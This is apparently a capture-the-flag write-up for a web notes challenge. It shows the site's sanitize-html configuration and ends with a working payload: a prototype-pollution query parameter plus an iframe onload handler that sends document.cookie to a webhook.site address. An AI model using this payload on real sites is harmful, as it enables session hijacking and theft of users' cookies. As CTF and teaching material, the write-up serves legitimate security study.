## Description
Casual coding vibes...until the notes start acting weird.

## Solution
The site provided looks like this
<img width="1919" height="683" alt="image" src="https://github.com/user-attachments/assets/fe973214-2163-4de8-8ff7-be871801e17b" />

In the source code we see that there's a `/note` and `/report` endpoint, and there's a sanitize html code block
```
sanitizeHtml.defaults = {allowedTags: ["h3", "h4", "h5", "h6", "blockquote", "p", "a", "ul", "ol", "nl", "li", "b", "i", "strong", "em", "strike", "abbr", "code", "hr", "br", "div", "table", "thead", "caption", "tbody", "tr", "th", "td", "pre", "iframe"], disallowedTagsMode: "discard", allowedAttributes: {a: ["href", "name", "target"], img: ["src"]}, selfClosing: ["img", "br", "hr", "area", "base", "basefont", "input", "link", "meta"], allowedSchemes: ["http", "https", "ftp", "mailto"], allowedSchemesByTag: {}, allowedSchemesAppliedToAttributes: ["href", "src", "cite"], allowProtocolRelative: true, enforceHtmlBoundary: false};
```
This is a classic XSS challenge with prototyping pollution. We then use this payload to obtain the flag
```
http://127.0.0.1:5000/?__proto__[*]=['onload']&note=<iframe onload="fetch('https://webhook.site/7cc8de8a-4e1a-48c4-91b8-89b3a0591a0f?c='+document.cookie)"></iframe>
```
